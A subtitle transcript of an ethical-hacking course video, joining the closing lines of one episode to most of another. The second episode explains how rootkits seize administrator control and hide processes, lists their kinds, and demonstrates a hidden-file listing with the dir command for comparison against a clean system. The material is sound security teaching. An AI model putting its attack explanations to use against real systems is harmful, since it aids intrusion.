applications.\n\n854\n00:38:21.590 --> 00:38:26.920\nWe talked about DLL hijacking as\nwell as just teaching our users,\n\n855\n00:38:26.920 --> 00:38:30.160\nkeeping them educated,\nnot to click on things.\n\n856\n00:38:30.160 --> 00:38:31.940\nSo, we appreciate that Adam, and\n\n857\n00:38:31.940 --> 00:38:34.700\nI know we've got more to\ngo with our system hacking.\n\n858\n00:38:34.700 --> 00:38:37.570\nBut we're gonna have to come back and\ndo another part for that.\n\n859\n00:38:37.570 --> 00:38:39.080\nWe are out of time for this one.\n\n860\n00:38:39.080 --> 00:38:41.565\nSo signing off for\nITProTV, I'm Mike Rodrick.\n\n861\n00:38:41.565 --> 00:38:42.940\n>> I\"m Adam Gordon.\n\n862\n00:38:42.940 --> 00:38:46.243\n>> We'll see you next time.\n\n863\n00:38:46.243 --> 00:38:53.210\n[MUSIC]\n\n",

00:00:19.862\nI'm your host Mike Rodrick, and\ntoday we're doing CEH version 9.\n\n4\n00:00:19.862 --> 00:00:24.040\nAnd specifically in this episode we're\ngonna be looking at system hacking.\n\n5\n00:00:24.040 --> 00:00:26.860\nThis is a continuation\nof our thought process.\n\n6\n00:00:26.860 --> 00:00:29.080\nWe've already gone through\na couple of episodes.\n\n7\n00:00:29.080 --> 00:00:31.890\nSo if you haven't seen those first two,\nmake sure you go back and check them out.\n\n8\n00:00:31.890 --> 00:00:36.110\nBut we're gonna continue that discussion\nas well as throw a couple of exciting\n\n9\n00:00:36.110 --> 00:00:39.500\ndemos your way and here's to do that for\nus is Mr. Adam Gordon.\n\n10\n00:00:39.500 --> 00:00:40.790\nHow are you doing Adam?\n\n11\n00:00:40.790 --> 00:00:42.280\n>> Good.\nI'm warming up my pitching arms, so\n\n12\n00:00:42.280 --> 00:00:43.585\nI can throw demos.\n\n13\n00:00:43.585 --> 00:00:45.476\n>> [LAUGH]\n>> Out at our studio audience and\n\n14\n00:00:45.476 --> 00:00:46.511\nmake it exciting.\n\n15\n00:00:46.511 --> 00:00:49.285\n>> [LAUGH]\n>> All right.\n\n16\n00:00:49.285 --> 00:00:52.210\nSo we're gonna go ahead, we're gonna\ntalk some more about system hacking.\n\n17\n00:00:52.210 --> 00:00:53.650\nWe've been talking a lot.\n\n18\n00:00:53.650 --> 00:00:54.640\nIn our prior episodes,\n\n19\n00:00:54.640 --> 00:00:57.320\nas Mike just mentioned,\nabout the basic concepts, right?\n\n20\n00:00:57.320 --> 00:00:58.120\nWhat do we hack?\n\n21\n00:00:58.120 --> 00:00:58.730\nHow do we do that?\n\n22\n00:00:58.730 --> 00:01:00.090\nWhy do we do that?\n\n23\n00:01:00.090 --> 00:01:01.419\nHow do we defend against that?\n\n24\n00:01:01.419 --> 00:01:02.760\nWhat are countermeasures?\n\n25\n00:01:02.760 --> 00:01:05.490\nWe've been going through and\nspeaking about a lot of these things.\n\n26\n00:01:05.490 --> 00:01:10.110\nWe're gonna continue that thought process,\nwe've been talking about going through and\n\n27\n00:01:10.110 --> 00:01:12.000\nactually spent a fair amount of time.\n\n28\n00:01:12.000 --> 00:01:15.580\nIn episode one about cracking\npasswords and how to deal with that.\n\n29\n00:01:15.580 --> 00:01:17.700\nWe spoke about, in the last episode,\n\n30\n00:01:17.700 --> 00:01:21.710\nescalating privileges and how to execute\napplications, what we can do there.\n\n31\n00:01:21.710 --> 00:01:25.000\nWhat would be the way in which\nwe can escalate a privilege and\n\n32\n00:01:25.000 --> 00:01:26.350\ngain an advantage in some way,\n\n33\n00:01:26.350 --> 00:01:30.770\nmaybe some sort of injection attack,\nbuffer overflows, all that kind of stuff.\n\n34\n00:01:30.770 --> 00:01:33.360\nWe went into that in\npretty good depth I think.\n\n35\n00:01:33.360 --> 00:01:36.920\nAlthough there's always I'm sure room in\nthe pond for a little bit more knowledge\n\n36\n00:01:36.920 --> 00:01:40.050\nat some point right but we're gonna\ntalk about hiding files a little bit.\n\n37\n00:01:40.050 --> 00:01:44.860\nWe'll go in talk about and discuss\nthe issues and concerns about rootkits.\n\n38\n00:01:44.860 --> 00:01:47.440\nTake a look at how you\npotentially can define rootkits.\n\n39\n00:01:47.440 --> 00:01:49.252\nWhat they are but\nalso how you may find them.\n\n40\n00:01:49.252 --> 00:01:52.070\nWe're just having this conversion\noffline before we get started.\n\n41\n00:01:52.070 --> 00:01:56.150\nWe'll also talk about how we can go in and\nhide files, and do a variety of things,\n\n42\n00:01:56.150 --> 00:01:58.000\nwe'll take a look at\nthe alternate data streams.\n\n43\n00:01:58.000 --> 00:02:02.150\nHave an interesting little demo setup for\nyou that will do on a Windows 10 box,\n\n44\n00:02:02.150 --> 00:02:03.385\nto show you what it looks like.\n\n45\n00:02:03.385 --> 00:02:06.980\nAnd the most recent version of the\noperating system on the desktop side and\n\n46\n00:02:06.980 --> 00:02:09.450\nit's been working this way\npretty much since Windows 2000,\n\n47\n00:02:09.450 --> 00:02:11.300\nthis is not new by any means.\n\n48\n00:02:11.300 --> 00:02:13.660\nActually, in theory back even before that.\n\n49\n00:02:13.660 --> 00:02:16.700\nBut it's certainly not new and we'll take\na look at how we can deal with this.\n\n50\n00:02:16.700 --> 00:02:18.962\nBut let's start by talking\nabout root kits, what they are.\n\n51\n00:02:18.962 --> 00:02:21.554\nWhen we think about root kits,\nI think about Sony.\n\n52\n00:02:21.554 --> 00:02:22.811\n>> [LAUGH]\n>> That's what I think,\n\n53\n00:02:22.811 --> 00:02:23.463\nthat's exactly what I think.\n\n54\n00:02:23.463 --> 00:02:25.205\n>> I think about root kits,\nSony pops to mind.\n\n55\n00:02:26.255 --> 00:02:28.095\nGreat electronics, horrible root kits.\n\n56\n00:02:28.095 --> 00:02:29.965\nYou just have to define what you want.\n\n57\n00:02:29.965 --> 00:02:33.305\nBut when I think about root kits,\naside from the obvious,\n\n58\n00:02:33.305 --> 00:02:35.595\nwe think about software\nmalware certainly first and\n\n59\n00:02:35.595 --> 00:02:39.215\nforemost when a classified is something\nwe don't want on our systems.\n\n60\n00:02:39.215 --> 00:02:42.765\nBut we think about a piece of software,\nthat unlike some other malware, and\n\n61\n00:02:42.765 --> 00:02:45.180\nall malware in theory is bad, right?\n\n62\n00:02:45.180 --> 00:02:48.540\nAnd I say in theory because certain\nmalware isn't gonna do a lot of harm,\n\n63\n00:02:48.540 --> 00:02:49.970\nit's just gonna be nuisance, right?\n\n64\n00:02:49.970 --> 00:02:51.850\nIf you get adware on your system,\n\n65\n00:02:51.850 --> 00:02:54.390\nyou're gonna get pop-ups\nwith a lot of garbage, but\n\n66\n00:02:54.390 --> 00:02:58.550\nit's not really gonna affect the overall\nintegrity of the system for the most part.\n\n67\n00:02:58.550 --> 00:03:02.250\nRight, it's more of a problem and\na nuisance than it is anything else but\n\n68\n00:03:02.250 --> 00:03:06.160\nthe reality is when you get a trojan,\nwhen you get a virus.\n\n69\n00:03:06.160 --> 00:03:10.550\nWhen you get a worm, when you get\na remote access device of some kind or\n\n70\n00:03:10.550 --> 00:03:14.294\nother piece of software that gives you\nremote access trojan capability to command\n\n71\n00:03:14.294 --> 00:03:15.920\nand control that system.\n\n72\n00:03:15.920 --> 00:03:18.510\nWe talked about key loggers\nin our last episode and\n\n73\n00:03:18.510 --> 00:03:20.260\nsome of the prompts associated with them.\n\n74\n00:03:20.260 --> 00:03:22.420\nWhen you get these kinds of malware,\n\n75\n00:03:22.420 --> 00:03:25.570\nyou're dealing with something that's\nout beyond just being a nuisance, and\n\n76\n00:03:25.570 --> 00:03:27.530\noccasionally putting up\na screen that says, hey.\n\n77\n00:03:27.530 --> 00:03:29.820\nWould you like to buy this, or go here?\n\n78\n00:03:29.820 --> 00:03:32.480\nWe've actually got software\nthat's looking to take over and\n\n79\n00:03:32.480 --> 00:03:35.790\npotentially control elements of how\nthe system, the core system, right,\n\n80\n00:03:35.790 --> 00:03:37.590\nthe operating system is gonna run.\n\n81\n00:03:37.590 --> 00:03:39.220\nRoot kits go deeper and\n\n82\n00:03:39.220 --> 00:03:43.870\ngo broader than that because they burrow\nin traditionally to the operating system.\n\n83\n00:03:43.870 --> 00:03:47.330\nAt the very core levels of it,\nthey seem to hide themselves.\n\n84\n00:03:47.330 --> 00:03:50.020\nSo they cloak themselves in\na variety of techniques and\n\n85\n00:03:50.020 --> 00:03:54.430\na variety of mechanisms that make it\nvery difficult for us to find them.\n\n86\n00:03:54.430 --> 00:03:55.940\nAnd what they then tend to do,\n\n87\n00:03:55.940 --> 00:04:00.380\nif they are going to be working the right\nway, is they accomplish three things.\n\n88\n00:04:00.380 --> 00:04:04.740\nOne, they tend to take over the system,\ngiving the malware and\n\n89\n00:04:04.740 --> 00:04:07.890\nor the operator who may be controlling it,\nroute level access,\n\n90\n00:04:07.890 --> 00:04:10.270\nhence the name route kit\nin generic language.\n\n91\n00:04:10.270 --> 00:04:12.530\nIn Windows, we're talking about\nfull administrative rights.\n\n92\n00:04:12.530 --> 00:04:16.650\nSo they're gonna essentially come up\nwith a way to take over the system and\n\n93\n00:04:16.650 --> 00:04:20.100\ngive the operator, the bad actor,\nthe ability to then control.\n\n94\n00:04:20.100 --> 00:04:23.370\nOr, if it's just a system, define piece\nof malware that's been thrown out there.\n\n95\n00:04:23.370 --> 00:04:25.110\nIt's not something remotely controlled,\nbut\n\n96\n00:04:25.110 --> 00:04:29.890\nit's launched into the system to burrow,\nto effectively take over,\n\n97\n00:04:29.890 --> 00:04:34.700\nperhaps launch other pieces of malware,\ntrojan the box, do whatever it's gonna do.\n\n98\n00:04:34.700 --> 00:04:38.580\nIt may be the delivery mechanism to then\nopen the system up to remote control.\n\n99\n00:04:38.580 --> 00:04:40.700\nBut it may not be remote\ncontrolled by itself.\n\n100\n00:04:40.700 --> 00:04:43.020\nSo rootkits seek to really take over and\n\n101\n00:04:43.020 --> 00:04:46.890\nmodify the functional way in which\nthe operating system will behave.\n\n102\n00:04:46.890 --> 00:04:49.737\nIt may very well inject\nalternate file system DLLs,\n\n103\n00:04:49.737 --> 00:04:53.810\ndo a variety of things to be able to\ncompromise the integrity of the system,\n\n104\n00:04:53.810 --> 00:04:57.884\none of the way's we'll talk about of\npotentially finding rootkits is to do\n\n105\n00:04:57.884 --> 00:05:02.114\na comparison of the files in the operating\nsystem against a known good image.\n\n106\n00:05:02.114 --> 00:05:05.665\nAnd then use a program to be able to do\na comparison and look for differences,\n\n107\n00:05:05.665 --> 00:05:09.385\nbecause the problem with rootkits, and\nwe spoke about this with keyloggers and\n\n108\n00:05:09.385 --> 00:05:13.320\nsome of the other stealthy software\nthat we spoke about in the last episode.\n\n109\n00:05:13.320 --> 00:05:16.210\nIs they, will more often than not,\nrun under the radar.\n\n110\n00:05:16.210 --> 00:05:18.940\nWe took the time to look\nat task manager and say,\n\n111\n00:05:18.940 --> 00:05:21.900\nhey look at what's running there and\nthen we talked about the fact that there's\n\n112\n00:05:21.900 --> 00:05:25.270\nusually a lot of things that are not\nlisted and you will not find them.\n\n113\n00:05:25.270 --> 00:05:29.410\nAt least not using just a GUI\nbased interface in the OS itself.\n\n114\n00:05:29.410 --> 00:05:32.760\nAnd if the rootkit is installed,\nthe controls essentially\n\n115\n00:05:32.760 --> 00:05:36.630\nwhat programs are gonna be able to be\nseen and what programs will show up,\n\n116\n00:05:36.630 --> 00:05:39.870\nit's even less likely that the rootkit\nwill show up in that particular area.\n\n117\n00:05:39.870 --> 00:05:42.690\nSo you may need to use alternate software.\n\n118\n00:05:42.690 --> 00:05:46.110\nThings like,\nI mentioned this in a couple episode.\n\n119\n00:05:46.110 --> 00:05:48.390\nAn oldie but a goodie,\nhijack this, for instance, right?\n\n120\n00:05:48.390 --> 00:05:50.330\nI think we've talked about this before.\n\n121\n00:05:50.330 --> 00:05:52.580\nThat's usually good at\nfinding some of this.\n\n122\n00:05:52.580 --> 00:05:57.058\nBut we made, or actually Mike made\nan excellent point before we came on this\n\n123\n00:05:57.058 --> 00:06:01.680\nparticular episode which is a lot of\nthis software may have uninstallers that\n\n124\n00:06:01.680 --> 00:06:06.399\ndon't work the right way, if it even has\nan uninstaller a lot of this Malware.\n\n125\n00:06:06.399 --> 00:06:09.864\nThe reality is that our uninstaller\nprobably loads more malware when you go\n\n126\n00:06:09.864 --> 00:06:13.070\nfind it online as opposed to less and\ngets rid of what's there.\n\n127\n00:06:13.070 --> 00:06:16.030\nOr when they take out that malware and\nput other malware in because\n\n128\n00:06:16.030 --> 00:06:19.710\nthe person who created the uninstaller\nwants their malware to be on your system,\n\n129\n00:06:19.710 --> 00:06:22.830\nnot the malware that they\nsupposedly are going to get rid of.\n\n130\n00:06:22.830 --> 00:06:25.130\nYou'll see there's a lot of issues and\nconcerns with going out and\n\n131\n00:06:25.130 --> 00:06:29.190\nfinding software online that\nmay eliminate this problem.\n\n132\n00:06:29.190 --> 00:06:32.680\nAnd usually rootkits are specifically\ndesigned to do certain things.\n\n133\n00:06:32.680 --> 00:06:34.595\nThey're very good at hiding\ntheir presence and so\n\n134\n00:06:34.595 --> 00:06:37.568\nyou may need to get a specifically\ndesigned piece of software to remove them.\n\n135\n00:06:37.568 --> 00:06:42.240\nA root kit revealer, right, or\nsome sort of root kit finder program.\n\n136\n00:06:42.240 --> 00:06:46.180\nAnd these are usually gonna created,\nmore often than not,\n\n137\n00:06:46.180 --> 00:06:49.680\nyou'll find them from the AV vendor or\nwhoever's researched the root kit and\n\n138\n00:06:49.680 --> 00:06:54.060\nfound it and figured out what to do\nabout how to essentially define it.\n\n139\n00:06:54.060 --> 00:06:56.060\nThey know what it does,\nthey know where it lives,\n\n140\n00:06:56.060 --> 00:07:00.030\nthey know what kind of actions it gets up\nto what kind of tell-tale signs there are,\n\n141\n00:07:00.030 --> 00:07:05.410\nand so they may create the semantics,\nthe caspursky's of the world.\n\n142\n00:07:05.410 --> 00:07:09.950\nThey may create a root kit program that\nwill remove the root kit essentially,\n\n143\n00:07:09.950 --> 00:07:11.100\na removal program.\n\n144\n00:07:11.100 --> 00:07:14.710\nBut you may need to go find a very\nspecifically crafted piece of software for\n\n145\n00:07:14.710 --> 00:07:16.390\nthe unique root kit you have.\n\n146\n00:07:16.390 --> 00:07:19.170\nAnd if you don't know what you're infected\nwith, it may be very difficult for\n\n147\n00:07:19.170 --> 00:07:20.090\nyou to find that.\n\n148\n00:07:20.090 --> 00:07:22.870\nWhile we're talking, when you get it\nready let us know we'll put it up.\n\n149\n00:07:22.870 --> 00:07:27.260\nCan you go out and do a search and\nlook for either a heat map on malware,\n\n150\n00:07:27.260 --> 00:07:30.443\nspecifically on root kits\nand/or can you look for\n\n151\n00:07:30.443 --> 00:07:34.760\na listing of whats going on recently\nmaybe what some of the top ones,\n\n152\n00:07:34.760 --> 00:07:37.836\nsome of the virus research\nsites may have that.\n\n153\n00:07:37.836 --> 00:07:40.888\nWe may be able to then click through\na link and see, look this rootkit,\n\n154\n00:07:40.888 --> 00:07:42.352\nhere's what we do to get rid of it.\n\n155\n00:07:42.352 --> 00:07:43.494\n>> That's real good.\n\n156\n00:07:43.494 --> 00:07:45.528\n>> I just want to more or less give\nthe people out there an idea, right,\n\n157\n00:07:45.528 --> 00:07:46.710\nof what we're looking at.\n\n158\n00:07:46.710 --> 00:07:48.170\nSo when we think about rootkits, right?\n\n159\n00:07:48.170 --> 00:07:51.676\nWe typically think about systems that\nhave been compromised in some way,\n\n160\n00:07:51.676 --> 00:07:54.401\ndrive by downloads,\nsomebody gets a piece of software.\n\n161\n00:07:54.401 --> 00:07:58.469\nMike and I were sharing a thumb drive\nhere before we came on to try to transfer\n\n162\n00:07:58.469 --> 00:08:02.879\na file we were trying to download for one\nof the demos bouncing between machines.\n\n163\n00:08:02.879 --> 00:08:08.005\nThat kind of thing can easily move\nFiles around without being detected and\n\n164\n00:08:08.005 --> 00:08:11.730\nit's again very easy to\ninfect the system drive.\n\n165\n00:08:11.730 --> 00:08:15.140\nAnd then infect anything you plugin\nto that laptop or that system and\n\n166\n00:08:15.140 --> 00:08:19.210\nthen infect that mobile media and move it\naround, it wouldn't very difficult at all.\n\n167\n00:08:19.210 --> 00:08:21.680\nFor me to have potentially\nmoved a virus around or\n\n168\n00:08:21.680 --> 00:08:25.460\nMike potentially to have on his machine\na virus that may have jumped around or\n\n169\n00:08:25.460 --> 00:08:27.270\na piece of malware that\nmay have jumped around.\n\n170\n00:08:27.270 --> 00:08:29.854\nBut we want to root the system,\ngaining back door and\n\n171\n00:08:29.854 --> 00:08:31.632\nadministrator privilege access.\n\n172\n00:08:31.632 --> 00:08:33.230\nIt's really what a root kit does.\n\n173\n00:08:33.230 --> 00:08:36.240\nWe want to be able to mask\nthe tracks of the attacker.\n\n174\n00:08:36.240 --> 00:08:37.114\nHide activity.\n\n175\n00:08:37.114 --> 00:08:41.129\nA lot of times the root kit, as I said,\nwill insert itself in between\n\n176\n00:08:41.129 --> 00:08:45.778\nthe processing of information from the\nkernel of the OS out and block access for\n\n177\n00:08:45.778 --> 00:08:50.460\ncertain processes to be seen by\nthe operating system's GUI interface.\n\n178\n00:08:50.460 --> 00:08:54.320\nIt'll stealth those processes in other\nwords, and will hide the malware,\n\n179\n00:08:54.320 --> 00:08:57.720\nIt will hide the remote access trojans.\n\n180\n00:08:57.720 --> 00:09:00.633\nIt'll try to stealth\ncontrol information or\n\n181\n00:09:00.633 --> 00:09:03.704\ncontrol system functions\nthat are being used.\n\n182\n00:09:03.704 --> 00:09:06.483\nSo, it will block a lot of these\nthings and not expose them, and\n\n183\n00:09:06.483 --> 00:09:07.700\nwe have to be aware of that.\n\n184\n00:09:07.700 --> 00:09:11.510\nSo it's gonna run, it's gonna store\ninformation it finds waiting for\n\n185\n00:09:11.510 --> 00:09:14.140\nit to be picked up,\npasswords, things like that.\n\n186\n00:09:14.140 --> 00:09:16.250\nAll that kind of stuff's gonna\nbe coming out, potentially.\n\n187\n00:09:16.250 --> 00:09:18.260\nAnd rootkits will pick up on all of this.\n\n188\n00:09:18.260 --> 00:09:19.650\nSo we have different kinds of root kits.\n\n189\n00:09:19.650 --> 00:09:23.380\nWe have hyper visor level\nroot kits that are available.\n\n190\n00:09:23.380 --> 00:09:26.940\nAnd can be used essentially against\nvirtual machine infrastructure.\n\n191\n00:09:26.940 --> 00:09:29.620\nThis is becoming really big, and\na big issue in cloud computing,\n\n192\n00:09:29.620 --> 00:09:32.360\nin regards to growth of\nvirtualization today.\n\n193\n00:09:32.360 --> 00:09:34.530\nHardware or firmware based root kits.\n\n194\n00:09:34.530 --> 00:09:37.760\nSo we have roots kits that essentially\nmay infect the firmware and,\n\n195\n00:09:37.760 --> 00:09:40.560\nor the operational\ninstructions set of hardware.\n\n196\n00:09:40.560 --> 00:09:43.630\nA lot of times you'll get hardware\ncoming in that's refurbed,\n\n197\n00:09:43.630 --> 00:09:48.380\nthis is one of the ways that firmware\nis gonna spread this malware.\n\n198\n00:09:48.380 --> 00:09:51.460\nIf you get a refurbed or\nrefurbished piece of hardware and\n\n199\n00:09:51.460 --> 00:09:53.260\nwe've all probably done\nthis at some point, right?\n\n200\n00:09:53.260 --> 00:09:56.380\nGone out and bought hardware off eBay or\nbought it wherever.\n\n201\n00:09:56.380 --> 00:09:57.700\nAnd you get it shipped in.\n\n202\n00:09:57.700 --> 00:10:00.950\nA lot of times you get this stuff and\nif you don't really think about it, and\n\n203\n00:10:00.950 --> 00:10:04.590\ndon't think about where it's coming from,\nand don't think about the fact that some\n\n204\n00:10:04.590 --> 00:10:08.980\ngroup of people, multiple people, had this\nstuff in their possession along the way.\n\n205\n00:10:08.980 --> 00:10:11.310\nAnd you don't check it and\njust plug it in.\n\n206\n00:10:11.310 --> 00:10:13.199\nYou don't know what your installing and\n\n207\n00:10:13.199 --> 00:10:17.390\nwhat you're configuring potentially access\nand allowing access to in your systems.\n\n208\n00:10:17.390 --> 00:10:18.820\nI see this happen all the time.\n\n209\n00:10:18.820 --> 00:10:21.700\nVendor sends stuff in and\nthen somebody unboxes it and\n\n210\n00:10:21.700 --> 00:10:22.700\nthen just plugs it right in.\n\n211\n00:10:22.700 --> 00:10:24.210\nIf you can't find it,\ndon't worry about it, it's not a big deal.\n\n212\n00:10:24.210 --> 00:10:27.070\nI just thought it would be nice\nto throw up one of those things.\n\n213\n00:10:27.070 --> 00:10:27.720\nI have some sites.\n\n214\n00:10:27.720 --> 00:10:29.050\nWe'll put them up later in the show notes.\n\n215\n00:10:29.050 --> 00:10:31.710\nAnd I'll give you some\ninformation we could put up.\n\n216\n00:10:31.710 --> 00:10:32.770\nKernel level route kits.\n\n217\n00:10:32.770 --> 00:10:36.370\nThis is gonna go in as I said,\nadd malicious code in, and\n\n218\n00:10:36.370 --> 00:10:40.620\ntry to interact with the kernel and\nthe device drivers, and swap them out, and\n\n219\n00:10:40.620 --> 00:10:44.020\ndo all sorts of things there to Intercept\ncontrol of the operating system,\n\n220\n00:10:44.020 --> 00:10:46.220\nand redirect it to the Malware.\n\n221\n00:10:46.220 --> 00:10:47.910\nBoot loader route kits.\n\n222\n00:10:47.910 --> 00:10:50.930\nWhere, although they're\nnot as prevalent today.\n\n223\n00:10:50.930 --> 00:10:53.750\nWe replace the original boot\nloader with a new one that\n\n224\n00:10:53.750 --> 00:10:55.640\nessentially will route the system.\n\n225\n00:10:55.640 --> 00:10:58.390\nAllowing everything to be controlled\nthrough the new boot loader,\n\n226\n00:10:58.390 --> 00:11:02.650\nwhich effectively gives the system's\ncontrol over to the malware.\n\n227\n00:11:02.650 --> 00:11:03.890\nSo, this is a big issue.\n\n228\n00:11:03.890 --> 00:11:07.180\nApplication level root kits and\nof course library level root kits,\n\n229\n00:11:07.180 --> 00:11:11.430\nwhere we're gonna go out and replace\noriginal system calls with fake calls.\n\n230\n00:11:11.430 --> 00:11:12.530\nAnd again, stealth.\n\n231\n00:11:12.530 --> 00:11:15.030\nAnd control and\ndo the things that root kits are doing.\n\n232\n00:11:15.030 --> 00:11:18.777\nThe idea of the root kit is essentially\nsome sort of abstraction layer of\n\n233\n00:11:18.777 --> 00:11:19.407\nsoftware.\n\n234\n00:11:19.407 --> 00:11:22.030\nBecause that's essentially\nwhat it is operating as.\n\n235\n00:11:22.030 --> 00:11:26.880\nWhatever level it inserts itself to\nrun all the control of the OS and\n\n236\n00:11:26.880 --> 00:11:30.210\nthe functions through it deciding what\nwill and what will not be allowed.\n\n237\n00:11:30.210 --> 00:11:32.915\nThat's essentially how it's going to\noperate and what it really more or\n\n238\n00:11:32.915 --> 00:11:33.903\nless is going to get up to.\n\n239\n00:11:33.903 --> 00:11:37.248\nThe idea behind it is really not\nthat complicated, but of course,\n\n240\n00:11:37.248 --> 00:11:40.780\nthe ways in which it works can prove\nto be a bit of a challenge to us.\n\n241\n00:11:40.780 --> 00:11:45.190\nNow if we want to be able to go out and\nwe want to be able to actually find\n\n242\n00:11:45.190 --> 00:11:49.390\nevidence of a rootkit, as I said there\nare multiple ways for us to do this.\n\n243\n00:11:49.390 --> 00:11:53.150\nOne of the ways, very simple, very easy,\nvery effective, would be to go out and\n\n244\n00:11:53.150 --> 00:11:57.190\ndetect root kits by doing, as I mentioned\na moment ago, a file list comparison.\n\n245\n00:11:57.190 --> 00:12:00.280\nCan we make it go over to the demo\nmachine here, for just a second?\n\n246\n00:12:00.280 --> 00:12:02.060\nI wanna show everybody\nsomething real quick.\n\n247\n00:12:02.060 --> 00:12:06.830\nAll right, so let me go and,\nthat's the one right there.\n\n248\n00:12:06.830 --> 00:12:09.420\nSo, I got a bunch of\ndifferent command lines open.\n\n249\n00:12:09.420 --> 00:12:11.750\nAnd so, what we can do we can do\nis something very straightforward.\n\n250\n00:12:11.750 --> 00:12:13.220\nWe can do something like this.\n\n251\n00:12:13.220 --> 00:12:14.640\nWe're going to be able to go and\n\n252\n00:12:14.640 --> 00:12:17.750\nwe’re going to be able to,\nIf you take a look on the screen.\n\n253\n00:12:17.750 --> 00:12:21.290\nWe're going to be able to just type in\na very simple command and there we go.\n\n254\n00:12:21.290 --> 00:12:24.176\nWe're going to be able to go and\ntype in dir, so\n\n255\n00:12:24.176 --> 00:12:26.249\njust go to the root of the C drive.\n\n256\n00:12:26.249 --> 00:12:28.480\nYou wanna probably do this\nfrom the root of the C drive,\n\n257\n00:12:28.480 --> 00:12:31.633\nbecause the reality is if you do it from\none of the subdirectories you're only\n\n258\n00:12:31.633 --> 00:12:33.840\ngonna list the files in that directory,\nright?\n\n259\n00:12:33.840 --> 00:12:37.800\nUnless we think the rootkit is definitely\nthere, probably not a good idea to do it\n\n260\n00:12:37.800 --> 00:12:40.200\nfrom that directory, because you're\nnot going to get everything.\n\n261\n00:12:40.200 --> 00:12:45.205\nSo go to the root of the C drive type\ndir forward slash s, forward space,\n\n262\n00:12:45.205 --> 00:12:49.894\nforward slash s, space forward\nslash b ,space forward slash.\n\n263\n00:12:49.894 --> 00:12:53.750\nI'm going to show you what these\nswitches are in just a minute.\n\n264\n00:12:53.750 --> 00:12:57.110\nAnd then I just pipe that,\nI output it to a text file,\n\n265\n00:12:57.110 --> 00:12:59.180\nbecause otherwise I'm going to\nrun that list to the screen,\n\n266\n00:12:59.180 --> 00:13:02.210\nand in the console it's not going to do\nme any good, so I just went ahead and\n\n267\n00:13:02.210 --> 00:13:08.790\nI output that out to a file in a directory\ncalled test a file called root1.txt.\n\n268\n00:13:08.790 --> 00:13:13.250\nSo when I run that, what I get here\n\n269\n00:13:13.250 --> 00:13:17.870\nis a file that lists, as you can see,\nas I just scroll down.\n\n270\n00:13:17.870 --> 00:13:21.180\nEvery directory and\nevery file in the directory here.\n\n271\n00:13:21.180 --> 00:13:23.480\nProgram files, program data.\n\n272\n00:13:23.480 --> 00:13:24.509\nAll that kind of stuff.\n\n273\n00:13:26.310 --> 00:13:29.490\nI'm getting all of this and\nI'm taking a look at everything.\n\n274\n00:13:29.490 --> 00:13:32.280\nNow what I'm getting essentially\nis an accurate listing\n\n275\n00:13:32.280 --> 00:13:35.810\nof every file that is\nsitting in the system, right?\n\n276\n00:13:35.810 --> 00:13:39.356\nAnd so what I want to be able\nto then do is take that and\n\n277\n00:13:39.356 --> 00:13:44.060\nI just want to show you what the switches\nare just so that you can see.\n\n278\n00:13:44.060 --> 00:13:46.230\nIf you're not familiar with the switches,\nand\n\n279\n00:13:46.230 --> 00:13:49.020\nyou may not be, we know we can\nalways go look up the help files.\n\n280\n00:13:49.020 --> 00:13:51.650\nSo just do a DIR-space-forward\nslash-question mark to\n\n281\n00:13:51.650 --> 00:13:53.240\nget the help file real quick.\n\n282\n00:13:53.240 --> 00:13:57.230\nAnd what we're doing is just going in and,\nyeah, you may have to,\n\n283\n00:13:57.230 --> 00:14:02.870\nto like a dual page help files you wanna\ngo through and just make sure you hit\n\n284\n00:14:02.870 --> 00:14:06.550\nthe key to continue or just do it slash\nP and bring it up one page at a time.\n\n285\n00:14:06.550 --> 00:14:10.420\nBut what we basically are doing is just\nlooking at the switches that are available\n\n286\n00:14:10.420 --> 00:14:17.480\nand now what we did was we went ahead.\n\n287\n00:14:17.480 --> 00:14:18.480\nJust get rid of that.\n\n288\n00:14:18.480 --> 00:14:22.270\nWe went ahead, and\nwe typed in this command.\n\n289\n00:14:22.270 --> 00:14:24.960\nI'll just put it down here on\nthe bottom so you can see it.\n\n290\n00:14:24.960 --> 00:14:29.953\nAnd what we're essentially doing is\nusing the S switch here to display files\n\n291\n00:14:29.953 --> 00:14:31.210\nin the directory.\n\n292\n00:14:31.210 --> 00:14:33.650\nSo, we want to list all of the files.\n\n293\n00:14:33.650 --> 00:14:38.330\nWe're then going to go ahead and\nwe are going to, [COUGH] no heading\n\n294\n00:14:38.330 --> 00:14:42.800\ninformation or summary to use just bare\nformat, just give us the general list,\n\n295\n00:14:42.800 --> 00:14:46.415\nin other words just the file list\nitself the actual list of the file.\n\n296\n00:14:46.415 --> 00:14:47.745\nFile name and the path.\n\n297\n00:14:47.745 --> 00:14:49.525\nNothing else is what we want.\n\n298\n00:14:49.525 --> 00:14:51.065\nAnd then we're gonna go in and\n\n299\n00:14:51.065 --> 00:14:54.245\nwe're gonna use display\nthe file with these attributes.\n\n300\n00:14:54.245 --> 00:14:55.525\nLook for hidden files.\n\n301\n00:14:55.525 --> 00:14:57.395\nAge is the hidden file switch.\n\n302\n00:14:57.395 --> 00:14:57.980\nRight?\n\n303\n00:14:57.980 --> 00:14:59.480\nAnd files ready for archiving and\n\n304\n00:14:59.480 --> 00:15:03.210\nyou can see all sorts of different\nfile options there, S, etc.\n\n305\n00:15:03.210 --> 00:15:08.530\nSo I can list, not just the files but also\nhidden files and specifically what I want,\n\n306\n00:15:08.530 --> 00:15:12.830\nby using that, is to come up with a list\nof all files and all directories.\n\n307\n00:15:12.830 --> 00:15:16.270\nEven if they maybe massed from\nthe GUI interface normally, right.\n\n308\n00:15:16.270 --> 00:15:19.230\nSo, manipulating the properties of\n\n309\n00:15:19.230 --> 00:15:21.570\nthe file listing through\nthe directory command.\n\n310\n00:15:21.570 --> 00:15:24.130\nLet's me see the hidden files.\n\n311\n00:15:24.130 --> 00:15:27.580\nNow once I get that,\nwhat I then have to do is go to a clean\n\n312\n00:15:27.580 --> 00:15:31.020\nversion of the operating system because\nwe're assuming this box that we're running\n\n313\n00:15:31.020 --> 00:15:33.640\nthis on is perhaps got\nmalware on it right?\n\n314\n00:15:33.640 --> 00:15:34.880\nMost likely a root kit.\n\n315\n00:15:34.880 --> 00:15:38.380\nSo we're going to hopefully capture\nthat in that list of all the files.\n\n316\n00:15:38.380 --> 00:15:41.730\nAnd see some DLL's and\nmaybe an EXE and who knows what.\n\n317\n00:15:41.730 --> 00:15:44.840\nBut, stuff that would stand\nout as being red flags.\n\n318\n00:15:44.840 --> 00:15:48.080\nBut we may not recognize it just\nby looking at 1,000 files and\n\n319\n00:15:48.080 --> 00:15:50.150\ngoing, look that's 